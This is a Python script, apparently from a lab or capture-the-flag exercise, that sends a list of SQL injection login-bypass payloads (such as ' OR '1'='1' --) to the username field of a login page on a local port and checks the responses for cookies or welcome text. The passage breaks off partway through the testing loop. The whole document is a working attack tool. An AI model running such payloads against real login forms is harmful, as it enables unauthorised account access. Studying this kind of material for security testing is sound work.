import requests
import re

# Target URL
target_url = "http://127.0.0.1:33168/login.php"

# SQL injection payloads for login bypass
payloads = [
    # Classic bypasses
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1'#",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "admin'--",
    "admin'#",
    "' OR '1'='1' LIMIT 1 --",
    
    # Boolean-based
    "' AND '1'='1",
    "' AND 1=1--",
    "' OR '1'='1' AND '1'='1'--",
    
    # Username variations
    "admin' OR '1'='1",
    "admin' OR '1'='1'--",
    "admin' OR 1=1--",
    "' OR 'a'='a",
    
    # Comments variations
    "' OR '1'='1';--",
    "' OR '1'='1'/*",
    
    # Simple quotes
    "'",
    "''",
    '"',
    '""'
]

print(f"[*] Testing {len(payloads)} SQL injection payloads on {target_url}")
print(f"[*] Testing username field with empty password\n")

# Track interesting responses
interesting_results = []

for i, payload in enumerate(payloads, 1):
    try:
        # Test payload on username field with empty password
        data = {
            'username': payload,
            'password': ''
        }
        
        response = requests.post(target_url, data=data, timeout=10)
        
        # Extract key info
        status = response.status_code
        content_length = len(response.content)
        has_cookies = len(response.cookies) > 0
        
        # Check for common login success indicators
        has_welcome = re.search(r'welcome|dashboard|logged in|success', response.text, re.I) is not None
